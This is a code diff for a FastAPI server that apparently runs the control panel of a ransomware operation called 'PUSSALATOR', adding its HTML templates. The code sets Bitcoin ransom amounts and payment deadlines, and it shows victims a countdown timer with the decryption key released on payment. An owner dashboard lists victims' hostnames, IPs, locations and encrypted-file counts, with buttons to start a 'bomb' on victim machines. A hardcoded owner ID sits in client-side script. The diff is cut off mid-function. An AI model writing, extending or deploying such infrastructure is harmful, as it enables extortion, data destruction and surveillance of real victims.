@@ -28,10 +28,10 @@ from pydantic import BaseModel
 
 # ============================================================================
 # CONFIGURATION
-# ============================================================================
+#============================================================================
 
 class Config:
-    SECRET_KEY = os.environ.get('SECRET_KEY')
+    SECRET_KEY = os.environ.get('SECRET_KEY', 'dev-key-change-this')
     
     # Supabase credentials
     SUPABASE_URL = os.environ.get('SUPABASE_URL')
@@ -39,17 +39,17 @@ class Config:
     SUPABASE_SERVICE_KEY = os.environ.get('SUPABASE_SERVICE_KEY')
     
     # Ransom settings
-    DEFAULT_RANSOM_AMOUNT = os.environ.get('DEFAULT_RANSOM_AMOUNT') or '0.5 BTC'
+    DEFAULT_RANSOM_AMOUNT = os.environ.get('DEFAULT_RANSOM_AMOUNT', '0.5 BTC')
     DEFAULT_BTC_ADDRESS = os.environ.get('DEFAULT_BTC_ADDRESS')
-    DEFAULT_DEADLINE_HOURS = int(os.environ.get('DEFAULT_DEADLINE_HOURS') or 72)
+    DEFAULT_DEADLINE_HOURS = int(os.environ.get('DEFAULT_DEADLINE_HOURS', 72))
     
     # Owner credentials - CHANGE THIS!
-    OWNER_ID = os.environ.get('OWNER_ID')
+    OWNER_ID = os.environ.get('OWNER_ID', '40671Mps19*')
     OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD')
     
     # Telegram (optional)
-    TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN') or ''
-    TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID') or ''
+    TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
+    TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')
     
     # Server settings
     DEBUG = os.environ.get('DEBUG', 'False').lower() == 'true'
@@ -60,8 +60,14 @@ class Config:
 # SUPABASE CLIENT
 # ============================================================================
 
-supabase: Client = create_client(Config.SUPABASE_URL, Config.SUPABASE_KEY)
-supabase_admin: Client = create_client(Config.SUPABASE_URL, Config.SUPABASE_SERVICE_KEY)
+# Initialize Supabase clients
+supabase = None
+supabase_admin = None
+
+if Config.SUPABASE_URL and Config.SUPABASE_KEY:
+    supabase = create_client(Config.SUPABASE_URL, Config.SUPABASE_KEY)
+if Config.SUPABASE_URL and Config.SUPABASE_SERVICE_KEY:
+    supabase_admin = create_client(Config.SUPABASE_URL, Config.SUPABASE_SERVICE_KEY)
 
 # ============================================================================
 # PYDANTIC MODELS
@@ -154,6 +160,8 @@ def generate_encryption_key() -> str:
 
 def log_action(action: str, details: str, victim_id: str = None):
     """Log system action to Supabase"""
+    if not supabase_admin:
+        return
     try:
         supabase_admin.table('system_logs').insert({
             'level': 'INFO',
@@ -166,10 +174,15 @@ def log_action(action: str, details: str, victim_id: str = None):
 
 def get_stats() -> Dict[str, Any]:
     """Get system statistics from Supabase"""
+    if not supabase_admin:
+        return {
+            'total': 0, 'paid': 0, 'unpaid': 0, 'expired': 0,
+            'total_files': 0, 'active_bombs': 0, 'paid_today': 0
+        }
+    
     try:
         # Total victims
         total = supabase_admin.table('victims').select('*', count='exact').execute()
-        total_count = len(total.data)
         
         # By status
         paid = supabase_admin.table('victims').select('*', count='exact').eq('status', 'paid').execute()
@@ -240,12 +253,14 @@ async def lifespan(app: FastAPI):
     print("=" * 60)
     
     # Test Supabase connection
-    try:
-        test = supabase_admin.table('victims').select('count', count='exact').limit(1).execute()
-        print("[+] Supabase connection successful")
-    except Exception as e:
-        print(f"[-] Supabase connection failed: {e}")
-        print("Check your SUPABASE_URL and SUPABASE_KEY")
+    if supabase_admin:
+        try:
+            test = supabase_admin.table('victims').select('count', count='exact').limit(1).execute()
+            print("[+] Supabase connection successful")
+        except Exception as e:
+            print(f"[-] Supabase connection failed: {e}")
+    else:
+        print("[-] Supabase not configured - running in mock mode")
     
     yield
     
@@ -269,6 +284,1081 @@ app.add_middleware(
 )
 
 # ============================================================================
+# HTML TEMPLATES - Define before routes
+# ============================================================================
+
+LOGIN_PAGE = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PUSSALATOR</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            margin: 0;
+            padding: 10px;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            max-width: 600px;
+            width: 100%;
+            margin: 20px auto;
+            border: 2px solid #ff0000;
+            padding: 30px 20px;
+            background: #000000;
+            box-shadow: 0 0 20px #ff0000;
+            text-align: center;
+        }
+        h1 {
+            font-size: 42px;
+            color: #ff0000;
+            text-shadow: 0 0 10px #ff0000;
+            margin: 10px 0;
+            animation: flicker 3s infinite;
+        }
+        @media (max-width: 480px) { h1 { font-size: 32px; } }
+        @keyframes flicker {
+            0% { opacity: 1; }
+            50% { opacity: 0.9; }
+            51% { opacity: 1; }
+            60% { opacity: 0.95; }
+            100% { opacity: 1; }
+        }
+        .subtitle {
+            color: #ff6666;
+            margin-bottom: 25px;
+            font-size: 16px;
+            border-bottom: 1px dashed #ff0000;
+            padding-bottom: 15px;
+        }
+        .ascii {
+            color: #ff0000;
+            font-size: 10px;
+            line-height: 1.2;
+            white-space: pre;
+            margin: 15px 0;
+            overflow-x: auto;
+        }
+        .input-group { margin: 25px 0; }
+        .input-field {
+            background: #111;
+            border: 2px solid #ff0000;
+            color: #00ff00;
+            padding: 12px 15px;
+            font-family: 'Courier New', monospace;
+            font-size: 16px;
+            width: 100%;
+            max-width: 300px;
+            margin: 10px auto;
+            display: block;
+            text-align: center;
+        }
+        .input-field:focus {
+            outline: none;
+            border-color: #00ff00;
+            box-shadow: 0 0 15px #ff0000;
+        }
+        .button {
+            background: #ff0000;
+            color: black;
+            border: none;
+            padding: 12px 30px;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 10px;
+            transition: 0.3s;
+            border-radius: 3px;
+        }
+        .button:hover {
+            background: #ff3333;
+            box-shadow: 0 0 15px #ff0000;
+            transform: scale(1.02);
+        }
+        .stats {
+            color: #ff6666;
+            margin-top: 25px;
+            font-size: 13px;
+            padding: 15px;
+            background: #111;
+            border: 1px solid #330000;
+            border-radius: 5px;
+        }
+        .message {
+            color: #ff6666;
+            margin-top: 15px;
+            min-height: 25px;
+            font-size: 14px;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 10px;
+            color: #333;
+        }
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-top: 15px;
+        }
+        .stat-item {
+            background: #1a0000;
+            padding: 8px;
+            border-radius: 3px;
+        }
+        .stat-label {
+            font-size: 11px;
+            color: #ff9999;
+        }
+        .stat-number {
+            font-size: 18px;
+            color: #ff0000;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="ascii">
+    /\\____/\\    
+   (  o  o  )   
+   (   ==   )   
+    (______)    
+        </div>
+        
+        <h1>PUSSALATOR</h1>
+        <div class="subtitle">> ENTER ACCESS ID <</div>
+        
+        <div class="input-group">
+            <input type="text" id="access_id" class="input-field" placeholder="ENTER ID" autocomplete="off" onkeypress="handleKey(event)">
+            <button class="button" onclick="submitId()">SUBMIT</button>
+        </div>
+        
+        <div id="message" class="message"></div>
+        
+        <div class="stats" id="stats">
+            <div>Loading system data...</div>
+        </div>
+        
+        <div class="footer">
+            SYSTEM v1.0 | FOR VM TESTING ONLY
+        </div>
+    </div>
+
+    <script>
+        const OWNER_ID = '40671Mps19*';
+        
+        function handleKey(e) {
+            if (e.key === 'Enter') {
+                submitId();
+            }
+        }
+        
+        async function submitId() {
+            const id = document.getElementById('access_id').value.trim();
+            const messageDiv = document.getElementById('message');
+            
+            if (!id) {
+                messageDiv.innerHTML = 'Please enter an ID';
+                return;
+            }
+            
+            // Check if it's the owner ID
+            if (id === OWNER_ID) {
+                const password = prompt('Enter owner password:');
+                if (!password) return;
+                
+                try {
+                    const response = await fetch('/api/owner/login', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({owner_id: id, password: password})
+                    });
+                    
+                    const data = await response.json();
+                    if (data.success) {
+                        window.location.href = '/owner/dashboard';
+                    } else {
+                        messageDiv.innerHTML = 'Invalid password';
+                    }
+                } catch(e) {
+                    messageDiv.innerHTML = 'Connection error';
+                }
+                return;
+            }
+            
+            // Check if it's a victim ID
+            try {
+                const response = await fetch(`/api/victim/${id}`);
+                if (response.status === 200) {
+                    window.location.href = `/victim/${id}`;
+                } else {
+                    messageDiv.innerHTML = 'Invalid ID';
+                    document.getElementById('access_id').value = '';
+                }
+            } catch(e) {
+                messageDiv.innerHTML = 'Connection error';
+            }
+        }
+        
+        async function loadStats() {
+            try {
+                const response = await fetch('/api/stats');
+                const stats = await response.json();
+                
+                document.getElementById('stats').innerHTML = `
+                    <div class="stats-grid">
+                        <div class="stat-item">
+                            <div class="stat-label">TOTAL</div>
+                            <div class="stat-number">${stats.total}</div>
+                        </div>
+                        <div class="stat-item">
+                            <div class="stat-label">PAID</div>
+                            <div class="stat-number">${stats.paid}</div>
+                        </div>
+                        <div class="stat-item">
+                            <div class="stat-label">ACTIVE</div>
+                            <div class="stat-number">${stats.active_bombs || 0}</div>
+                        </div>
+                    </div>
+                    <div style="margin-top: 10px; font-size: 11px;">
+                        Files encrypted: ${(stats.total_files || 0).toLocaleString()}
+                    </div>
+                `;
+            } catch(e) {
+                document.getElementById('stats').innerHTML = 'System data unavailable';
+            }
+        }
+        
+        loadStats();
+        setInterval(loadStats, 10000);
+    </script>
+</body>
+</html>
+"""
+
+VICTIM_PAGE_TEMPLATE = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Victim Status - PUSSALATOR</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            margin: 0;
+            padding: 15px;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            max-width: 700px;
+            width: 100%;
+            margin: 20px auto;
+            border: 2px solid #ff0000;
+            padding: 25px 20px;
+            background: #000000;
+            box-shadow: 0 0 20px #ff0000;
+        }
+        h1 {
+            color: #ff0000;
+            text-align: center;
+            font-size: 32px;
+            margin: 5px 0 20px;
+            text-shadow: 0 0 8px #ff0000;
+        }
+        @media (max-width: 480px) { h1 { font-size: 24px; } }
+        .info-box {
+            background: #111;
+            border: 1px solid #330000;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 5px;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 5px 0;
+            border-bottom: 1px solid #222;
+        }
+        .info-label {
+            color: #ff9999;
+            font-weight: bold;
+        }
+        .info-value {
+            color: #00ff00;
+            word-break: break-word;
+            text-align: right;
+        }
+        .key-box {
+            background: #003300;
+            border: 2px solid #00ff00;
+            padding: 20px;
+            margin: 20px 0;
+            word-break: break-all;
+            font-family: monospace;
+            font-size: 14px;
+            border-radius: 5px;
+            color: #00ff00;
+        }
+        .status-box {
+            text-align: center;
+            padding: 20px;
+            margin: 15px 0;
+            border-radius: 5px;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        .status-paid {
+            background: #003300;
+            color: #00ff00;
+            border: 2px solid #00ff00;
+        }
+        .status-unpaid {
+            background: #333300;
+            color: #ffff00;
+            border: 2px solid #ffff00;
+        }
+        .status-expired {
+            background: #330000;
+            color: #ff6666;
+            border: 2px solid #ff6666;
+        }
+        .timer {
+            font-size: 36px;
+            text-align: center;
+            color: #ff0000;
+            margin: 20px 0;
+            padding: 15px;
+            background: #1a0000;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+        @media (max-width: 480px) { .timer { font-size: 28px; } }
+        .button {
+            background: #ff0000;
+            color: black;
+            border: none;
+            padding: 12px 25px;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            font-size: 14px;
+            cursor: pointer;
+            margin: 10px 5px;
+            border-radius: 3px;
+            transition: 0.3s;
+        }
+        .button:hover {
+            background: #ff3333;
+            box-shadow: 0 0 15px #ff0000;
+        }
+        .button-small { padding: 8px 15px; font-size: 12px; }
+        .back-link {
+            display: inline-block;
+            margin-top: 20px;
+            color: #ff6666;
+            text-decoration: none;
+            font-size: 14px;
+            padding: 8px 15px;
+            border: 1px solid #ff6666;
+            border-radius: 3px;
+        }
+        .back-link:hover {
+            background: #ff0000;
+            color: black;
+            border-color: #ff0000;
+        }
+        .btc-address {
+            background: #222;
+            padding: 10px;
+            font-family: monospace;
+            font-size: 14px;
+            color: #ffaa00;
+            word-break: break-all;
+            border-radius: 3px;
+            margin: 10px 0;
+        }
+        .copy-btn {
+            background: #333;
+            color: #ff6666;
+            border: 1px solid #ff6666;
+            padding: 5px 10px;
+            font-size: 12px;
+            cursor: pointer;
+            border-radius: 3px;
+        }
+        .copy-btn:hover {
+            background: #ff0000;
+            color: black;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔐 VICTIM PORTAL</h1>
+        <div id="content" style="min-height: 200px;">Loading...</div>
+        <div style="text-align: center;">
+            <a href="/" class="back-link">← BACK TO LOGIN</a>
+        </div>
+    </div>
+
+    <script>
+        const VICTIM_ID = '{{ victim_id }}';
+        
+        async function loadStatus() {
+            try {
+                const response = await fetch(`/api/victim/${VICTIM_ID}`);
+                if (!response.ok) throw new Error('Victim not found');
+                const v = await response.json();
+                
+                let html = '<div class="info-box">';
+                html += `
+                    <div class="info-row"><span class="info-label">Victim ID:</span><span class="info-value">${v.id}</span></div>
+                    <div class="info-row"><span class="info-label">Hostname:</span><span class="info-value">${v.hostname || 'Unknown'}</span></div>
+                    <div class="info-row"><span class="info-label">IP Address:</span><span class="info-value">${v.ip || '0.0.0.0'}</span></div>
+                    <div class="info-row"><span class="info-label">Location:</span><span class="info-value">${v.city || 'Unknown'}, ${v.country || 'Unknown'}</span></div>
+                    <div class="info-row"><span class="info-label">Files Encrypted:</span><span class="info-value">${(v.files || 0).toLocaleString()}</span></div>
+                    <div class="info-row" style="margin-top:10px;border-top:2px solid #ff0000;padding-top:10px;">
+                        <span class="info-label">Ransom:</span><span class="info-value" style="color:#ffaa00;">${v.ransom || '0.5 BTC'}</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">BTC Address:</span><span class="info-value" style="font-size:12px;">${v.wallet || '1PussWalletVMTest'}</span>
+                    </div>
+                </div>`;
+                
+                if (v.status === 'paid') {
+                    html += `<div class="status-box status-paid">✓ PAID ✓</div>`;
+                    if (v.key) {
+                        html += `<div class="key-box"><strong>🔑 KEY:</strong><br>${v.key}</div>`;
+                        html += `<div style="text-align:center;"><button class="button button-small" onclick="copyKey('${v.key}')">📋 COPY</button></div>`;
+                    }
+                } else if (v.status === 'expired') {
+                    html += `<div class="status-box status-expired">✗ EXPIRED ✗</div>`;
+                } else {
+                    html += `<div class="status-box status-unpaid">⏳ UNPAID ⏳</div>`;
+                    html += `<div class="btc-address" id="btcAddress">${v.wallet || '1PussWalletVMTest'}</div>`;
+                    html += `<div style="text-align:center;"><button class="copy-btn" onclick="copyBtc()">📋 COPY BTC</button></div>`;
+                    html += `<div class="timer" id="timer">Loading...</div>`;
+                }
+                
+                document.getElementById('content').innerHTML = html;
+                
+                if (v.status === 'unpaid' && v.deadline) updateTimer(v.deadline);
+                
+            } catch(e) {
+                document.getElementById('content').innerHTML = `<div style="color:#ff0000;padding:40px;text-align:center;">Error loading data</div>`;
+            }
+        }
+        
+        function updateTimer(deadlineStr) {
+            const deadline = new Date(deadlineStr).getTime();
+            function tick() {
+                const diff = deadline - new Date().getTime();
+                if (diff <= 0) {
+                    document.getElementById('timer').innerHTML = '⏰ EXPIRED ⏰';
+                    setTimeout(() => location.reload(), 2000);
+                    return;
+                }
+                const h = Math.floor(diff/(1000*60*60));
+                const m = Math.floor((diff%(1000*60*60))/(1000*60));
+                const s = Math.floor((diff%(1000*60))/1000);
+                document.getElementById('timer').innerHTML = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+            }
+            tick();
+            setInterval(tick, 1000);
+        }
+        
+        function copyKey(k) { navigator.clipboard.writeText(k).then(() => alert('✓ Key copied')); }
+        function copyBtc() { 
+            navigator.clipboard.writeText(document.getElementById('btcAddress').innerText).then(() => alert('✓ BTC address copied')); 
+        }
+        
+        loadStatus();
+        setInterval(loadStatus, 30000);
+    </script>
+</body>
+</html>
+"""
+
+OWNER_DASHBOARD_TEMPLATE = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Owner Dashboard - PUSSALATOR</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            background: #0a0a0a;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            margin: 0;
+            padding: 15px;
+        }
+        .navbar {
+            background: #1a0000;
+            padding: 15px;
+            border-bottom: 2px solid #ff0000;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .navbar h1 {
+            color: #ff0000;
+            margin: 0;
+            font-size: 28px;
+        }
+        .nav-links button {
+            background: #ff0000;
+            color: black;
+            border: none;
+            padding: 8px 15px;
+            margin-left: 10px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+        }
+        .nav-links button:hover {
+            background: #ff6666;
+        }
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+        .stat-card {
+            background: #1a0000;
+            border: 1px solid #ff0000;
+            padding: 15px;
+            text-align: center;
+        }
+        .stat-value {
+            font-size: 28px;
+            color: #ff0000;
+            font-weight: bold;
+        }
+        .stat-label {
+            font-size: 12px;
+            color: #ff9999;
+        }
+        .filters {
+            background: #1a0000;
+            padding: 15px;
+            border: 1px solid #ff0000;
+            margin-bottom: 20px;
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .filters input, .filters select {
+            background: black;
+            border: 1px solid #ff0000;
+            color: #00ff00;
+            padding: 8px 12px;
+            font-family: 'Courier New', monospace;
+        }
+        .filters button {
+            background: #ff0000;
+            color: black;
+            border: none;
+            padding: 8px 20px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .table-container {
+            overflow-x: auto;
+            background: #1a0000;
+            border: 1px solid #ff0000;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            min-width: 800px;
+        }
+        th {
+            background: #330000;
+            color: #ff0000;
+            padding: 12px;
+            text-align: left;
+        }
+        td {
+            padding: 10px 12px;
+            border-bottom: 1px solid #330000;
+        }
+        tr:hover {
+            background: #330000;
+        }
+        .status-paid {
+            color: #00ff00;
+            font-weight: bold;
+        }
+        .status-unpaid {
+            color: #ffff00;
+            font-weight: bold;
+        }
+        .status-expired {
+            color: #ff6666;
+            font-weight: bold;
+        }
+        .bomb-active {
+            color: #ff0000;
+            animation: blink 1s infinite;
+            font-weight: bold;
+        }
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+        .action-btn {
+            background: #333;
+            color: #ff6666;
+            border: 1px solid #ff0000;
+            padding: 4px 8px;
+            margin: 2px;
+            cursor: pointer;
+            font-size: 11px;
+        }
+        .action-btn:hover {
+            background: #ff0000;
+            color: black;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .modal.show {
+            display: flex;
+        }
+        .modal-content {
+            background: #1a0000;
+            border: 2px solid #ff0000;
+            padding: 25px;
+            max-width: 600px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        .logs-container {
+            background: black;
+            padding: 10px;
+            max-height: 300px;
+            overflow-y: auto;
+            font-size: 12px;
+        }
+        .log-entry {
+            padding: 5px;
+            border-bottom: 1px solid #330000;
+        }
+    </style>
+</head>
+<body>
+    <div class="navbar">
+        <h1>⚙️ OWNER DASHBOARD</h1>
+        <div class="nav-links">
+            <button onclick="loadData()">🔄 REFRESH</button>
+            <button onclick="showLogs()">📋 LOGS</button>
+            <button onclick="logout()">🚪 LOGOUT</button>
+        </div>
+    </div>
+    
+    <div class="stats-grid" id="statsGrid">
+        <div class="stat-card"><div class="stat-value" id="totalVictims">0</div><div class="stat-label">TOTAL</div></div>
+        <div class="stat-card"><div class="stat-value" id="paidVictims">0</div><div class="stat-label">PAID</div></div>
+        <div class="stat-card"><div class="stat-value" id="unpaidVictims">0</div><div class="stat-label">UNPAID</div></div>
+        <div class="stat-card"><div class="stat-value" id="expiredVictims">0</div><div class="stat-label">EXPIRED</div></div>
+        <div class="stat-card"><div class="stat-value" id="totalFiles">0</div><div class="stat-label">FILES</div></div>
+        <div class="stat-card"><div class="stat-value" id="activeBombs">0</div><div class="stat-label">BOMBS</div></div>
+    </div>
+    
+    <div class="filters">
+        <input type="text" id="searchInput" placeholder="Search ID, IP, hostname..." onkeyup="filterTable()">
+        <select id="statusFilter" onchange="filterTable()">
+            <option value="all">ALL STATUS</option>
+            <option value="paid">PAID</option>
+            <option value="unpaid">UNPAID</option>
+            <option value="expired">EXPIRED</option>
+        </select>
+        <select id="bombFilter" onchange="filterTable()">
+            <option value="all">ALL BOMBS</option>
+            <option value="active">ACTIVE</option>
+            <option value="inactive">INACTIVE</option>
+        </select>
+        <button onclick="exportData()">📥 EXPORT CSV</button>
+    </div>
+    
+    <div class="table-container">
+        <table id="victimsTable">
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>HOSTNAME</th>
+                    <th>LOCATION</th>
+                    <th>IP</th>
+                    <th>FILES</th>
+                    <th>STATUS</th>
+                    <th>BOMB</th>
+                    <th>TIME LEFT</th>
+                    <th>ACTIONS</th>
+                </tr>
+            </thead>
+            <tbody id="tableBody">
+                <tr><td colspan="9" style="text-align:center;padding:40px;">Loading victims...</td></tr>
+            </tbody>
+        </table>
+    </div>
+    
+    <!-- Victim Modal -->
+    <div class="modal" id="victimModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 style="color:#ff0000;">VICTIM DETAILS</h2>
+                <span class="close" onclick="closeModal()" style="color:#ff6666;font-size:28px;cursor:pointer;">&times;</span>
+            </div>
+            <div id="victimDetails"></div>
+            
+            <h3 style="color:#ff0000;margin:20px 0 10px;">CONTROL</h3>
+            <div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:20px;">
+                <button class="action-btn" onclick="startBomb()">💣 START BOMB</button>
+                <button class="action-btn" onclick="stopBomb()">🛑 STOP BOMB</button>
+                <button class="action-btn" onclick="markPaid()">💰 MARK PAID</button>
+                <button class="action-btn" onclick="deleteVictim()">❌ DELETE</button>
+            </div>
+            
+            <h3 style="color:#ff0000;margin:20px 0 10px;">EDIT</h3>
+            <div>
+                <input type="text" id="editRansom" class="edit-input" style="width:100%;padding:8px;margin:5px 0;background:#111;border:1px solid #ff0000;color:#00ff00;" placeholder="Ransom amount">
+                <input type="text" id="editBtc" class="edit-input" style="width:100%;padding:8px;margin:5px 0;background:#111;border:1px solid #ff0000;color:#00ff00;" placeholder="BTC Address">
+                <textarea id="editNotes" class="edit-input" style="width:100%;padding:8px;margin:5px 0;background:#111;border:1px solid #ff0000;color:#00ff00;" placeholder="Notes"></textarea>
+                <button class="action-btn" style="width:100%;" onclick="updateVictim()">💾 SAVE CHANGES</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Logs Modal -->
+    <div class="modal" id="logsModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 style="color:#ff0000;">SYSTEM LOGS</h2>
+                <span class="close" onclick="closeLogs()" style="color:#ff6666;font-size:28px;cursor:pointer;">&times;</span>
+            </div>
+            <div class="logs-container" id="logsContainer">Loading logs...</div>
+        </div>
+    </div>
+
+    <script>
+        let currentVictim = null;
+        let victims = [];
+        
+        async function loadData() {
+            await loadStats();
+            await loadVictims();
+        }
+        
+        async function loadStats() {
+            try {
+                const response = await fetch('/api/stats');
+                const stats = await response.json();
+                document.getElementById('totalVictims').textContent = stats.total || 0;
+                document.getElementById('paidVictims').textContent = stats.paid || 0;
+                document.getElementById('unpaidVictims').textContent = stats.unpaid || 0;
+                document.getElementById('expiredVictims').textContent = stats.expired || 0;
+                document.getElementById('totalFiles').textContent = (stats.total_files || 0).toLocaleString();
+                document.getElementById('activeBombs').textContent = stats.active_bombs || 0;
+            } catch(e) {
+                console.error('Stats error:', e);
+            }
+        }
+        
+        async function loadVictims() {
+            try {
+                const response = await fetch('/api/owner/victims');
+                victims = await response.json();
+                renderTable();
+            } catch(e) {
+                document.getElementById('tableBody').innerHTML = '<tr><td colspan="9" style="text-align:center;color:#ff0000;">Error loading victims</td></tr>';
+            }
+        }
+        
+        function renderTable() {
+            const searchTerm = document.getElementById('searchInput').value.toLowerCase();
+            const statusFilter = document.getElementById('statusFilter').value;
+            const bombFilter = document.getElementById('bombFilter').value;
+            
+            let filtered = victims.filter(v => {
+                const matchesSearch = searchTerm === '' || 
+                    (v.id && v.id.toLowerCase().includes(searchTerm)) ||
+                    (v.hostname && v.hostname.toLowerCase().includes(searchTerm)) ||
+                    (v.ip && v.ip.includes(searchTerm));
+                
+                const matchesStatus = statusFilter === 'all' || v.status === statusFilter;
+                const matchesBomb = bombFilter === 'all' || 
+                    (bombFilter === 'active' && v.bomb_status === 'active') ||
+                    (bombFilter === 'inactive' && v.bomb_status !== 'active');
+                
+                return matchesSearch && matchesStatus && matchesBomb;
+            });
+            
+            if (filtered.length === 0) {
+                document.getElementById('tableBody').innerHTML = '<tr><td colspan="9" style="text-align:center;">No victims found</td></tr>';
+                return;
+            }
+            
+            let html = '';
+            filtered.forEach(v => {
+                const deadline = v.deadline ? new Date(v.deadline) : null;
+                const now = new Date();
+                let timeLeft = '';
+                
+                if (deadline && v.status === 'unpaid') {
+                    const diff = deadline - now;
+                    if (diff > 0) {
+                        const hours = Math.floor(diff / (1000 * 60 * 60));
+                        const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+                        timeLeft = `${hours}h ${minutes}m`;
+                    } else {
+                        timeLeft = 'EXPIRED';
+                    }
+                }
+                
+                const bombIcon = v.bomb_status === 'active' ? '💣 ACTIVE' : '⚫';
+                const bombClass = v.bomb_status === 'active' ? 'bomb-active' : '';
+                
+                html += `<tr>
+                    <td><small>${(v.id || '').substring(0, 20)}...</small></td>
+                    <td>${v.hostname || 'Unknown'}</td>
+                    <td>${v.city || '?'}, ${v.country_code || 'XX'}</td>
+                    <td>${v.ip || '0.0.0.0'}</td>
+                    <td>${(v.files || 0).toLocaleString()}</td>
+                    <td><span class="status-${v.status || 'unknown'}">${v.status || 'unknown'}</span></td>
+                    <td class="${bombClass}">${bombIcon}<br><small>${(v.bomb_size || 0).toFixed(1)}GB</small></td>
+                    <td>${timeLeft}</td>
+                    <td>
+                        <button class="action-btn" onclick="viewVictim('${v.id}')">VIEW</button>
+                    </td>
+                </tr>`;
+            });
+            
+            document.getElementById('tableBody').innerHTML = html;
+        }
+        
+        function filterTable() {
+            renderTable();
+        }
+        
+        async function viewVictim(victimId) {
+            try {
+                const response = await fetch(`/api/owner/victim/${victimId}`);
+                currentVictim = await response.json();
+                
+                let details = '';
+                for (const [key, value] of Object.entries(currentVictim)) {
+                    if (key !== 'key' || currentVictim.status === 'paid') {
+                        details += `<div class="detail-row" style="padding:5px;background:#111;margin:2px 0;"><strong>${key}:</strong> ${value || 'N/A'}</div>`;
+                    }
+                }
+                
+                document.getElementById('victimDetails').innerHTML = details;
+                
+                // Pre-fill edit fields
+                document.getElementById('editRansom').value = currentVictim.ransom || '';
+                document.getElementById('editBtc').value = currentVictim.wallet || '';
+                document.getElementById('editNotes').value = currentVictim.notes || '';
+                
+                document.getElementById('victimModal').classList.add('show');
+            } catch(e) {
+                alert('Error loading victim details');
+            }
+        }
+        
+        function closeModal() {
+            document.getElementById('victimModal').classList.remove('show');
+            currentVictim = null;
+        }
+        
+        async function startBomb() {
+            if (!currentVictim) return;
+            const filename = prompt('Enter bomb filename:', 'explosion.dat') || 'explosion.dat';
+            
+            try {
+                const response = await fetch('/api/owner/bomb/start', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({victim_id: currentVictim.id, filename: filename})
+                });
+                
+                if (response.ok) {
+                    alert('Bomb started!');
+                    closeModal();
+                    loadVictims();
+                }
+            } catch(e) {
+                alert('Error starting bomb');
+            }
+        }
+        
+        async function stopBomb() {
+            if (!currentVictim) return;
+            
+            try {
+                const response = await fetch('/api/owner/bomb/stop', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({victim_id: currentVictim.id})
+                });
+                
+                if (response.ok) {
+                    alert('Bomb stopped!');
+                    closeModal();
+                    loadVictims();
+                }
+            } catch(e) {
+                alert('Error stopping bomb');
+            }
+        }
+        
+        async function markPaid() {
+            if (!currentVictim) return;
+            
+            try {
+                const response = await fetch(`/api/owner/mark-paid/${currentVictim.id}`, {
+                    method: 'POST'
+                });
+                
+                if (response.ok) {
+                    alert('Marked as paid!');
+                    closeModal();
+                    loadVictims();
+                }
+            } catch(e) {
+                alert('Error marking as paid');
+            }
+        }
+        
+        async function deleteVictim() {
+            if (!currentVictim) return;
